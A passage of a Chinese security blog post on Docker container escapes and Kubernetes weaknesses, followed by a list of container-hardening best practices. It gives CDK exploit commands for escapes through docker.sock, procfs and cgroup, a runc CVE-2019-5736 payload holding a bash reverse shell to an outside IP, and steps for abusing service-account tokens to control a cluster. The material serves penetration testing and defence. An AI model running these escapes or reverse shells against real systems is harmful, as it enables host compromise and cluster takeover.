<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot /<span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>使用cdk工具执行命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-sock-pwn /var/run/docker.sock <span class="string">&quot;touch /host/tmp/pwn-success&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="挂载-procfs-目录"><a href="#挂载-procfs-目录" class="headerlink" title="挂载 procfs 目录"></a>挂载 procfs 目录</h4><p>关于procfs</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时</span><br></pre></td></tr></table></figure>

<p>漏洞利用过程比较复杂，但是可以通过cdk快速利用。example:</p>
<ol>
<li>宿主机启动测试容器，挂载宿主机的procfs，尝试逃逸当前容器。docker run -v /root/cdk:/cdk -v /proc:/mnt/host_proc –rm -it ubuntu bash</li>
<li>容器内部执行 ./cdk run mount-procfs /mnt/host_proc “touch /tmp/exp-success”</li>
<li>宿主机中出现/tmp/exp-success文件，说明exp已经成功执行，攻击者可以在宿主机执行任意命令。</li>
</ol>
<p>参考：<a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK/wiki/Exploit:-mount-procfs">Exploit: mount procfs</a></p>
<h4 id="挂载-cgroup-目录"><a href="#挂载-cgroup-目录" class="headerlink" title="挂载 cgroup 目录"></a>挂载 cgroup 目录</h4><p>使用cdk进行利用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run mount-cgroup <span class="string">&quot;&lt;shell-cmd&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="程序漏洞导致Docker逃逸"><a href="#程序漏洞导致Docker逃逸" class="headerlink" title="程序漏洞导致Docker逃逸"></a>程序漏洞导致Docker逃逸</h3><h4 id="CVE-2019-5736-runc容器逃逸漏洞"><a href="#CVE-2019-5736-runc容器逃逸漏洞" class="headerlink" title="CVE-2019-5736 runc容器逃逸漏洞"></a>CVE-2019-5736 runc容器逃逸漏洞</h4><p><strong>漏洞详情</strong></p>
<p>Docker、containerd或者其他基于runc的容器运行时存在安全漏洞，攻击者通过特定的容器镜像或者exec操作可以获取到宿主机的runc执行时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限。</p>
<p><strong>影响范围</strong></p>
<p>Docker版本 &lt; 18.09.2<br>runc版本 &lt;= 1.0-rc6。</p>
<p><strong>利用步骤</strong></p>
<p>使用POC：</p>
<p>POC: <a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">CVE-2019-5736-PoC</a></p>
<ul>
<li>修改payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi main.go</span><br><span class="line">payload &#x3D; &quot;#!&#x2F;bin&#x2F;bash \n bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.172.136&#x2F;1234 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>编译</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>

<ul>
<li>拷贝到docker容器中执行</li>
<li>等待受害者使用<code>docker exec</code>连接容器</li>
<li>收到反弹shell</li>
</ul>
<h4 id="CVE-2019-14271-Docker-cp-命令容器逃逸攻击漏洞"><a href="#CVE-2019-14271-Docker-cp-命令容器逃逸攻击漏洞" class="headerlink" title="CVE-2019-14271 Docker cp 命令容器逃逸攻击漏洞"></a>CVE-2019-14271 Docker cp 命令容器逃逸攻击漏洞</h4><p><strong>漏洞详情</strong></p>
<p>当Docker宿主机使用cp命令时，会调用辅助进程docker-tar，该进程没有被容器化，且会在运行时动态加载一些libnss.so库。黑客可以通过在容器中替换libnss.so等库，将代码注入到docker-tar中。当Docker用户尝试从容器中拷贝文件时将会执行恶意代码，成功实现Docker逃逸，获得宿主机root权限。</p>
<p><strong>影响范围</strong></p>
<p>Docker 19.03.0</p>
<p><strong>漏洞参考</strong></p>
<p><a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/">Docker Patched the Most Severe Copy Vulnerability to Date With CVE-2019-14271</a></p>
<h4 id="CVE-2019-13139-Docker-build-code-execution"><a href="#CVE-2019-13139-Docker-build-code-execution" class="headerlink" title="CVE-2019-13139 Docker build code execution"></a>CVE-2019-13139 Docker build code execution</h4><p><strong>漏洞参考</strong></p>
<p><a target="_blank" rel="noopener" href="https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/">CVE-2019-13139 - Docker build code execution</a></p>
<h3 id="内核漏洞导致Docker-逃逸"><a href="#内核漏洞导致Docker-逃逸" class="headerlink" title="内核漏洞导致Docker 逃逸"></a>内核漏洞导致Docker 逃逸</h3><h4 id="DirtyCow-CVE-2016-5195-脏牛漏洞实现Docker-逃逸"><a href="#DirtyCow-CVE-2016-5195-脏牛漏洞实现Docker-逃逸" class="headerlink" title="DirtyCow(CVE-2016-5195)脏牛漏洞实现Docker 逃逸"></a>DirtyCow(CVE-2016-5195)脏牛漏洞实现Docker 逃逸</h4><p><strong>漏洞描述</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，通过它可实现Docker容器逃逸，获得root权限的shell。</span><br></pre></td></tr></table></figure>

<p>Docker 与 宿主机共享内核，因此容器需要在存在dirtyCow漏洞的宿主机里。</p>
<p><strong>漏洞复现</strong></p>
<p>环境获取：git clone <a target="_blank" rel="noopener" href="https://github.com/gebl/dirtycow-docker-vdso.git">https://github.com/gebl/dirtycow-docker-vdso.git</a></p>
<h3 id="工具使用-CDK"><a href="#工具使用-CDK" class="headerlink" title="工具使用 CDK"></a>工具使用 CDK</h3><p>CDK：<a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK">https://github.com/cdk-team/CDK</a></p>
<p>复制到container内</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 宿主机</span></span><br><span class="line">docker cp /Users/threezh1/Downloads/cdk_linux_amd64 e39eb7abd9e6:/root</span><br><span class="line"></span><br><span class="line"><span class="comment"># Container</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">mv cdk_linux_amd64 cdk</span><br><span class="line">chmod 777 cdk</span><br></pre></td></tr></table></figure>

<p>常用命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 信息收集</span></span><br><span class="line">cdk evaluate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列举全部exp</span></span><br><span class="line">cdk run --list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行指定的exp</span></span><br><span class="line">cdk run &lt;script-name&gt; [options]</span><br></pre></td></tr></table></figure>

<h2 id="k8s的安全问题"><a href="#k8s的安全问题" class="headerlink" title="k8s的安全问题"></a>k8s的安全问题</h2><p>通过cdk的evaluate的检测项，可以看一下k8s的安全问题。</p>
<h3 id="k8s搭建踩坑"><a href="#k8s搭建踩坑" class="headerlink" title="k8s搭建踩坑"></a>k8s搭建踩坑</h3><p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://learnku.com/articles/42843">https://learnku.com/articles/42843</a></li>
<li><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/kubernetes/dashboard/v1.10.1/src/deploy/recommended/kubernetes-dashboard.yaml">https://raw.githubusercontent.com/kubernetes/dashboard/v1.10.1/src/deploy/recommended/kubernetes-dashboard.yaml</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/kubernetes/dashboard">https://github.com/kubernetes/dashboard</a></li>
</ul>
<ol>
<li>先通过docker-desktop安装k8s，参考：<a target="_blank" rel="noopener" href="https://github.com/maguowei/k8s-docker-desktop-for-mac">https://github.com/maguowei/k8s-docker-desktop-for-mac</a></li>
<li>安装k8s <code>kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.2.0/aio/deploy/recommended.yaml</code></li>
<li>开启本地代理 <code>kubectl proxy</code></li>
<li>访问 <code>http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/</code></li>
<li>下方步骤获取token</li>
<li>安装helm<ol>
<li>brew install helm</li>
<li>helm repo add stable <a target="_blank" rel="noopener" href="http://mirror.azure.cn/kubernetes/charts/">http://mirror.azure.cn/kubernetes/charts/</a></li>
<li>helm repo update</li>
<li>helm install my-mysql stable/mysql</li>
</ol>
</li>
</ol>
<p>创建一个用户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f dashboard-adminuser.yaml</span><br></pre></td></tr></table></figure>

<p>dashboard-adminuser.yaml 内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: admin-user</span><br><span class="line">  namespace: kube-system</span><br></pre></td></tr></table></figure>

<p>获取token</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk &#39;&#123;print $1&#125;&#39;)</span><br></pre></td></tr></table></figure>

<h3 id="kube-proxy边界绕过-CVE-2020-8558"><a href="#kube-proxy边界绕过-CVE-2020-8558" class="headerlink" title="kube-proxy边界绕过(CVE-2020-8558)"></a>kube-proxy边界绕过(CVE-2020-8558)</h3><blockquote>
<p>攻击者可能通过同一局域网下的容器，或在集群节点上访问同一个二层域下的相邻节点上绑定监听了本地127.0.0.1端口的TCP/UDP服务，从而获取接口信息。</p>
</blockquote>
<p>详细介绍可以参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/210338">CVE-2020-8558：Kubernetes 本地主机边界绕过漏洞通告</a></p>
<p>列出可能受影响的服务：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsof +c 15 -P -n -i4TCP@127.0.0.1 -sTCP:LISTEN</span><br><span class="line">lsof +c 15 -P -n -i4UDP@127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="K8s-Api-server"><a href="#K8s-Api-server" class="headerlink" title="K8s Api-server"></a>K8s Api-server</h3><blockquote>
<p>检查ENV信息判断当前容器是否属于K8s Pod，获取K8s api-server连接地址并尝试匿名登录，如果成功意味着可以直接通过api-server接管K8s集群。</p>
</blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK/wiki/Evaluate:-K8s-API-Server">https://github.com/cdk-team/CDK/wiki/Evaluate:-K8s-API-Server</a></p>
<p>前提是必须k8s支持匿名登录，默认是不支持匿名登录的。如果存在这个问题，可以用<code>cdk kcurl anonymous</code>去发起HTTP请求。</p>
<h3 id="K8s-Service-Account"><a href="#K8s-Service-Account" class="headerlink" title="K8s Service Account"></a>K8s Service Account</h3><blockquote>
<p>K8s集群创建的Pod中，容器内部默认携带K8s Service Account的认证凭据(/run/secrets/kubernetes.io/serviceaccount/token)，CDK将利用该凭据尝试认证K8s api-server服务器并访问高权限接口，如果执行成功意味着该账号拥有高权限，您可以直接利用Service Account管理K8s集群。</p>
</blockquote>
<p>测试如下：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/02/26/16143126701679.jpg" alt="-w869"></p>
<p><strong>通过cdk连接K8s api-server发起自定义HTTP请求：</strong></p>
<p>先通过<code>cdk evaluate</code>判断是否存在这个问题</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/02/26/16143137745665.jpg" alt="-w829"></p>
<p>再获取k8s的api-server地址：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/02/26/16143142284777.jpg" alt="-w526"></p>
<p>然后通过<code>cdk kcurl</code>进行请求</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/02/26/16143142643198.jpg" alt="-w866"></p>
<p>之后使用CDK可以部署后门Pod和影子k8s api-server。</p>
<h2 id="容器安全最佳实践"><a href="#容器安全最佳实践" class="headerlink" title="容器安全最佳实践"></a>容器安全最佳实践</h2><p>这部分翻译自网络，后期整理。</p>
<ul>
<li>Container</li>
</ul>
<ol>
<li>始终使用最新版本的Docker</li>
<li>仅允许受信任的用户控制Docker守护程序</li>
<li>确保有适当的规则，可以提供以下方面的审查<ol>
<li>Docker守护程序</li>
<li>Docker文件和目录<ol>
<li>/var/lib/docker</li>
<li>/etc/docker</li>
<li>Docker.service</li>
<li>Docker.socket</li>
<li>/etc/default/docker</li>
<li>/etc/docker/daemon.json</li>
<li>/etc/sysconfig/docker</li>
<li>/usr/bin/containerd</li>
<li>/usr/sbin/runc</li>
</ol>
</li>
</ol>
</li>
<li>确保所有Docker文件和目录归适当的用户（通常是root用户）所有，并将其文件权限设置为限制性值，以保护所有Docker文件和目录</li>
<li>使用具有有效注册表证书的注册表或使用TLS的注册表，以最大程度地减少流量拦截的风险。</li>
<li>如果您使用的容器中没有在映像中定义显式容器用户，则应启用用户名称空间支持，这将允许您将容器用户重新映射为主机用户。</li>
<li>禁止容器获取新特权。默认情况下，允许容器获取新特权，因此必须显式设置此配置。您可以采取的最小化特权升级攻击的另一步骤是删除映像中的setuid和setgid权限。</li>
<li>以非root用户（UID不为0）运行容器。默认情况下，容器以root用户身份以容器内的root用户身份运行。</li>
<li>构建容器时，请仅使用受信任的基本映像。</li>
<li>使用不包含可能导致更大攻击面的不必要软件包的最小基础映像。</li>
<li>实施强有力的治理策略，以强制进行频繁的图像扫描。</li>
<li>构建一个工作流，该工作流定期标识并从主机中删除陈旧或未使用的图像和容器。</li>
<li>不要将机密存储在映像/ Dockerfile中。默认情况下，允许您将机密存储在Dockerfile中，但是将机密存储在映像中将使该映像的任何用户都可以访问该机密。</li>
<li>运行容器时，请删除容器按需运行所需的所有功能。</li>
<li>不要使用–privileged标志运行容器，因为这种类型的容器将具有底层主机可用的大多数功能。该标志还将覆盖您使用CAP DROP或CAP ADD设置的所有规则。(添加–no-new-privileges标志，始终使用来运行docker映像，–security-opt=no-new-privileges以防止使用setuid或setgid二进制文件升级特权。)</li>
<li>不要在容器上挂载敏感的主机系统目录，尤其是在可写模式下，这可能会使它们暴露于恶意更改之下，从而导致主机受损。</li>
<li>不要在容器中运行sshd。默认情况下，ssh守护程序将不会在容器中运行，并且您不应该安装ssh守护程序来简化SSH服务器的安全性管理</li>
<li>不要在容器内映射1024以下的任何端口，因为它们会传输敏感数据，因此会被视为特权端口。默认情况下，Docker会将容器端口映射到49153-65525范围内的端口，但它允许将容器映射到特权端口。根据一般经验，请确保仅在容器上打开需要的端口。</li>
<li>除非必要，否则不要共享主机的网络名称空间，进程名称空间，IPC名称空间，用户名称空间或UTS名称空间，以确保Docker容器与基础主机之间的正确隔离。</li>
<li>指定容器按设计运行所需的内存和CPU数量，而不是依赖于任意数量。默认情况下，Docker容器无限制地平均共享其资源。</li>
<li>将容器的根文件系统设置为只读。一旦运行，容器就不需要更改根文件系统。对根文件系统进行的任何更改都可能出于恶意目的。为了保留容器的不变性-不修补新容器而是从新映像重新创建容器-您不应使根文件系统可写。</li>
<li>施加PID限制。容器的优点之一是严格的过程标识符（PID）控制。内核中的每个进程都承载唯一的PID，容器利用Linux PID名称空间为每个容器提供PID层次结构的单独视图。对PID设置限制可有效限制每个容器中运行的进程数。限制容器中的进程数可以防止新进程的大量产生以及潜在的恶意横向移动。施加PID限制还可以防止叉子炸弹（不断自我复制的过程）和异常过程。通常，这样做的好处是，如果您的服务始终运行特定数量的进程，那么将PID限制设置为确切的数量可以缓解许多恶意行为，包括反向Shell和远程代码注入–实际上，</li>
<li>不要将您的挂载传播规则配置为共享。共享挂载传播意味着对挂载所做的任何更改都将传播到该挂载的所有实例。而是将挂载传播设置为从属模式或私有模式，以便对卷进行的必要更改不会与不需要该更改的容器共享（或传播到该容器）。</li>
<li>不要将docker exec命令与privated或user = root选项一起使用，因为此设置可以使容器具有扩展的Linux功能</li>
<li>不要使用默认网桥“ docker0”。使用默认网桥可以让您轻松应对ARP欺骗和MAC泛洪攻击。相反，容器应位于用户定义的网络上，而不是默认的“ docker0”网桥。</li>
<li>不要将Docker套接字安装在容器内，因为这种方法将允许容器内的进程执行命令，使其完全控制主机。</li>
<li>规则5-禁止容器间通讯（–icc = false）</li>
<li>使用Linux安全模块（seccomp，AppArmor或SELinux）</li>
<li>规则7-限制资源（内存，CPU，文件描述符，进程，重新启动）</li>
<li>规则＃8-将文件系统和卷设置为只读</li>
<li>规则10-将日志记录级别至少设置为INFO¶</li>
</ol>
<ul>
<li>Kubernetes安全最佳实践</li>
</ul>
<ol>
<li>对于RBAC，请为特定用户或用户组指定您的Roles和ClusterRoles，而不是向任何用户或用户组授予cluster-admin特权。</li>
<li>使用Kubernetes RBAC时避免重复权限，因为这样做可能会导致操作问题。</li>
<li>删除未使用或不活动的RBAC角色，以便在对故障进行故障排除或调查安全事件时将注意力集中在活动的角色上。</li>
<li>使用Kubernetes网络策略隔离您的Pod，并明确允许应用程序正常运行所需的通信路径。否则，您将同时遭受横向和南北威胁。</li>
<li>如果您的Pod需要Internet访问（入口或出口），则创建适当的网络策略以实施正确的网络分段/防火墙规则，然后创建该网络策略所针对的标签，最后将您的Pod与该标签关联。</li>
<li>使用PodSecurityPolicy准入控制器可以确保实施适当的管理策略。PodSecurityPolicy控制器可以阻止容器以root身份运行，或者确保容器的根文件系统以只读方式安装（这些建议听起来很耳熟，因为它们都在之前要采取的Docker措施清单中）。</li>
<li>使用Kubernetes准入控制器来实施映像注册表管理策略，以便自动拒绝从不受信任的注册表中获取的所有映像。</li>
</ol>
<ul>
<li>安全问题</li>
</ul>
<ol>
<li>上次扫描日期超过60天的主机上有多少张图像？</li>
<li>多少个图像/容器具有高严重性漏洞？</li>
<li>这些高度严重的易受攻击的容器会影响哪些部署？</li>
<li>受影响的部署中是否有任何存储秘密的容器？</li>
<li>是否有任何易受攻击的容器以root身份或特权标志运行？</li>
<li>Pod中是否有没有与之关联的网络策略（意味着它允许所有通信）的易受攻击的容器？</li>
<li>生产中运行的任何容器都会受到此漏洞的影响吗？</li>
<li>我们正在使用的图像来自哪里？</li>
<li>我们如何阻止从不受信任的注册表中提取的图像？</li>
<li>我们能够查看容器运行时正在执行哪些进程吗？</li>
<li>哪些集群，名称空间和节点不符合Docker和Kubernetes的CIS基准测试？</li>
</ol>
<ul>
<li>Dockerfile需要注意的问题</li>
</ul>
<ol>
<li>确保USER已经被指定</li>
<li>确保基本的镜像版本已经固定</li>
<li>确保操作系统包版本已经固定</li>
<li>避免使用ADD，尽量使用COPY</li>
<li>避免使用<code>apt/apk upgrade</code></li>
<li>避免在RUN指令中调用curl获取bash文件</li>
</ol>
<ul>
<li>静态分析工具</li>
</ul>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/coreos/clair">https://github.com/coreos/clair</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/aquasecurity/trivy">https://github.com/aquasecurity/trivy</a></li>
<li><a target="_blank" rel="noopener" href="https://snyk.io/">https://snyk.io/</a></li>
<li><a target="_blank" rel="noopener" href="https://anchore.com/opensource/">https://anchore.com/opensource/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/aquasecurity/microscanner">https://github.com/aquasecurity/microscanner</a></li>
<li><a target="_blank" rel="noopener" href="https://jfrog.com/xray/">https://jfrog.com/xray/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.qualys.com/apps/container-security/">https://www.qualys.com/apps/container-security/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.inspec.io/docs/reference/resources/docker/">https://www.inspec.io/docs/reference/resources/docker/</a></li>
<li><a target="_blank" rel="noopener" href="https://dev-sec.io/baselines/docker/">https://dev-sec.io/baselines/docker/</a></li>
</ol>
<ul>
<li>k8s config扫描工具</li>
</ul>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/Shopify/kubeaudit">https://github.com/Shopify/kubeaudit</a></li>
<li><a target="_blank" rel="noopener" href="https://kubesec.io/">https://kubesec.io/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/aquasecurity/kube-bench">https://github.com/aquasecurity/kube-bench</a></li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://tech.meituan.com/2020/03/12/cloud-native-security.html">美团技术团队-云原生之容器安全实践</a></li>
<li><a target="_blank" rel="noopener" href="https://kubernetes.io/zh/docs/concepts/security/overview/">云原生安全概述-Kubernetes</a></li>
<li><a target="_blank" rel="noopener" href="https://security.stackrox.com/rs/219-UEH-533/images/Container-security-going-beyond-image-scanning.pdf">Container Security:Going Beyond Image Scanning</a></li>
<li><a target="_blank" rel="noopener" href="https://www.stackrox.com/post/2019/09/docker-security-101/">Docker Container Security 101: Risks and 33 Best Practices</a></li>
<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html">Docker安全备忘单</a></li>
<li>[<a target="_blank" rel="noopener" href="https://resources.whitesourcesoftware.com/blog-whitesource/docker-container-security]">https://resources.whitesourcesoftware.com/blog-whitesource/docker-container-security]</a>(Docker Container Security: Challenges and Best Practices)</li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7881">Docker逃逸小结第一版 更新</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8558">渗透测试之Docker逃逸</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK/wiki/CDK-Home-CN">CDK Home CN</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/_GwGS0cVRmuWEetwMesauQ">【云原生攻防研究】容器逃逸技术概览</a></li>
<li><a target="_blank" rel="noopener" href="https://wohin.me/rong-qi-tao-yi-gong-fang-xi-lie-yi-tao-yi-ji-zhu-gai-lan/">容器逃逸技术概览</a></li>
</ul>

    </div>
    
</div>
    <div class="footer" id="footer">
    <p>Copyright © 2020 Threezh1
        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
        </label> -->
<!--         <script type="text/javascript">
        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
        </script> -->
    </p>
</div>
<input type="hidden" id="web_style" value="black">
<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">

<script src="/libs/jquery.min.js"></script>


<script src="/libs/highlight/highlight.pack.js"></script>

<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>

<script src="/js/js.js"></script>

<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>